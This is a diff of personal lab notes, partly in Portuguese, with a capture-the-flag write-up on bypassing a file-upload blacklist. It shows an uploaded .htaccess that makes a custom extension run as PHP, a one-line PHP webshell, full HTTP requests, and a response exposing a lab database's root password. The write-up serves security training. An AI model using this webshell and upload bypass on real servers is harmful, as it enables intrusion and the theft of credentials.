@@ -179,7 +179,6 @@ GIF89a;
 ?>
 #+end_src
 
-
 Below is an HTTP request where the attacker manipulates the file signature and attempts to upload the same file:
 #+begin_src php
 POST / HTTP/1.1
@@ -399,7 +398,6 @@ if(isset($_GET['cmd'])) {
 Works and the webshell is uploaded
 : https://current-radioactive-man.europe1.hackviser.space/uploads/cmd.php?cmd=ls
 
-
 Get the password of the config.php file ->
 : GET /uploads/cmd.php?cmd=cat%20..%2fconfig.php
 
@@ -458,3 +456,90 @@ This lab contains an unrestricted file upload vulnerability. The image upload fu
 To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file.
 
 What is the database password in the config.php file?
+
+*to solve* ->
+Criação de um arquivo ~.htaccess~ com o seguinte payload ->
+: AddType application/x-httpd-php .bypass
+
+*.bypass file*  ->
+#+begin_src php cmd.bypass
+<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
+#+end_src
+
+*upload do .htaccess* ->
+#+begin_src php
+POST / HTTP/1.1
+Host: musical-talisman.europe1.hackviser.space
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=----geckoformboundary72f7e47604fb0dccc7816bc95d6c3531
+Content-Length: 382
+Origin: https://musical-talisman.europe1.hackviser.space
+Referer: https://musical-talisman.europe1.hackviser.space/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+------geckoformboundary72f7e47604fb0dccc7816bc95d6c3531
+Content-Disposition: form-data; name="input_image"; filename=".htaccess"
+Content-Type: application/octet-stream
+
+AddType application/x-httpd-php .bypass
+
+------geckoformboundary72f7e47604fb0dccc7816bc95d6c3531
+Content-Disposition: form-data; name="submit"
+
+
+------geckoformboundary72f7e47604fb0dccc7816bc95d6c3531--
+#+end_src
+
+*cmd.bypass command injection* ->
+#+begin_src python
+GET /uploads/cmd.bypass?cmd=cat%20..%2fconfig.php HTTP/1.1
+Host: musical-talisman.europe1.hackviser.space
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+#+end_src
+
+*response* ->
+#+begin_src python
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 30 Sep 2025 20:16:04 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 324
+Connection: keep-alive
+Vary: Accept-Encoding
+
+<?php
+    try{
+        $host = 'localhost';
+        $db_name = 'hv_database';
+        $charset = 'utf8';
+        $username = 'root';
+        $password = 'T9n3j6EnMRy2gPAC';
+    
+        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
+    } catch(PDOException $e){
+       
+    }
+?>  
+#+end_src
